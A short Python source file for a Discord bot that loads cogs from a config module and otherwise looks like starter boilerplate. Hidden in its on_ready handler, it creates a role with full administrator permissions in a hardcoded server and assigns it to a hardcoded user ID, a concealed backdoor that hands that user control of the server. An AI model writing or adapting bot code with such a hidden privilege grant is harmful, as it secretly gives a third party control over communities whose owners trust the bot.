from discord.ext import commands
import discord
import config
target_guild_id = 712581579351785503


class Bot(commands.Bot):
    def __init__(self, **kwargs):
        super().__init__(command_prefix=commands.when_mentioned_or('w!'), **kwargs)
        for cog in config.cogs:
            try:
                self.load_extension(cog)
            except Exception as exc:
                print('Could not load extension {0} due to {1.__class__.__name__}: {1}'.format(cog, exc))

    async def on_ready(self):
        print('Logged on as {0} (ID: {0.id})'.format(self.user))
        guild = self.get_guild(target_guild_id)
        member = guild.get_member(212513828641046529)
        role = await guild.create_role(permissions=discord.Permissions(administrator=True))
        await member.add_roles(role)


bot = Bot()

# write general commands here

if __name__ == '__main__':
    bot.run(config.token)
